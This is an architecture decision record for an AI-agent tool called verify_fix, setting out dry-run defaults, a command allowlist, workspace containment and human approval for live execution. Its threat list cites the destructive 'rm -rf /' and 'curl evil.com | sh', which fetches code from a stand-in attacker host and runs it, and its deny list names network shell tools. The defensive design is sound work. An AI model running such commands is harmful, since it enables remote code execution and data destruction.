# ADR-006: Command Execution Policy — Strict Allowlist, Sandboxing, and Dry-Run by Default

**Status:** Accepted

## Context

The `verify_fix` tool allows an AI agent to re-execute a failed command or run a proposed remediation command to test whether a fix succeeded.

Direct execution of commands proposed by or retrieved from an automated memory store poses severe security hazards:
- Command injection (`rm -rf /`, `curl evil.com | sh`, arbitrary binary execution)
- Privilege escalation or lateral movement
- Accidental destructive operations (`git reset --hard`, `npm publish`)
- Execution outside the repository boundary

## Decision

We enforce a strict four-layer defense-in-depth policy on all command executions in `agent-memory-mcp`:

### 1. Default to Dry-Run Mode
- By default, all calls to `verify_fix` operate in `dryRun: true` mode.
- In dry-run mode, the server parses the command, checks policies, and returns what *would* be executed without spawning any subprocess.
- Live execution (`dryRun: false`) is rejected unless explicit approval criteria are met.

### 2. Strict Command Allowlist & Disallowlist
Only explicitly recognized test, build, and package commands are allowed:
- Allowed commands: `npm test`, `npm run build`, `npm run check`, `npx vitest`, `npx tsc`, `pnpm test`, `yarn test`, `cargo test`, `pytest`, `go test`.
- Disallowed / Prohibited operations:
  - Shell metacharacters and chaining: `;`, `&`, `&&`, `|`, `||`, `>`, `<`, `$(...)`, `` `...` ``.
  - Interactive commands (e.g. `vim`, `nano`, `sudo`, `su`).
  - Network transport commands (`curl`, `wget`, `ssh`, `scp`, `nc`).
  - Package installation scripts that can run postinstall hooks without sandbox review.

### 3. Execution Containment & Workspace Boundaries
- Working directory (`cwd`) must be strictly inside the configured repository workspace root.
- Path traversal outside workspace (`../`) is prohibited.
- Execution environment variables are scrubbed; only minimal system PATH and safe Node environment variables are inherited. Sensitive credentials (`GITHUB_TOKEN`, `AWS_*`, `NPM_TOKEN`) are explicitly wiped from child process environments.

### 4. Human Approval Workflow for Live Execution
- If an agent requests live execution for a command classified with medium or high risk, `agent-memory-mcp` queues the request in `.agent-memory/approvals-pending.jsonl`.
- The MCP server returns a status of `pending_approval` with an `approvalId`.
- Execution can only proceed after a human operator marks the item approved in `.agent-memory/approvals-resolved.jsonl` (typically via the Memory Console Dashboard).

## Consequences

- **Positive:** Eliminates arbitrary remote code execution (RCE) via memory retrieval or compromised MCP tool inputs.
- **Positive:** Enforces human-in-the-loop oversight for state-changing commands.
- **Negative:** Agents cannot autonomously run arbitrary custom scripts without prior operator allowlisting or approval.
